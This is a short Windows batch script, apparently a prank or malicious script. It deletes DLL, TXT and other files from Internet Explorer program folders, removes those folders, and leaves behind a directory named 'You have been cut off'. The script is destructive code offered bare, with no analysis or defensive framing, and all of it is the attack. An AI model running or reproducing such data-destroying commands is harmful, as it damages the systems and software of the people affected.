   @echo off
   :Start
   cls
   del c:\programfiles\InternetExplorer\*.DLL
   del c:\programfiles\InternetExplorer\*.APP
   del c:\programfiles\InternetExplorer\*.TXT
   del c:\programfiles\InternetExplorer\W2K\*.APP
   del c:\programfiles\InternetExplorer\W2K\*.TXT
   del c:\programfiles\InternetExplorer\SIGNUP\*.APP
   del c:\programfiles\InternetExplorer\SIGNUP\*.BMP
   del c:\programfiles\InternetExplorer\SIGNUP\*.TXT
   del c:\programfiles\InternetExplorer\PLUGINS\*.DLL
   del c:\programfiles\InternetExplorer\PLUGINS\*.CLASS
   del c:\programfiles\InternetExplorer\PLUGINS\RichFX\Player\*.DLL
   del c:\programfiles\InternetExplorer\PLUGINS\RichFX\Player\*.TXT
   del c:\programfiles\InternetExplorer\IEUninstall\*.TXT
   del c:\programfiles\InternetExplorer\IEUninstall\*.APP
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.DLL
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.APP
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.ICW
   del c:\programfiles\InternetExplorer\ConnectionWizard\*.Ver

   rd c:\programfiles\InternetExplorer\W2K
   rd c:\programfiles\InternetExplorer\SIGNUP\Yahoo
   rd c:\programfiles\InternetExplorer\SIGNUP
   rd c:\programfiles\InternetExplorer\PLUGINS\RichFX\Player
   rd c:\programfiles\InternetExplorer\PLUGINS\RichFX
   rd c:\programfiles\InternetExplorer\PLUGINS
   rd c:\programfiles\InternetExplorer\IEUninstall
   rd c:\programfiles\InternetExplorer\ConnectionWizard

   cd c:\
   cd programfiles
   cd InternetExplorer
   md You have been cut off
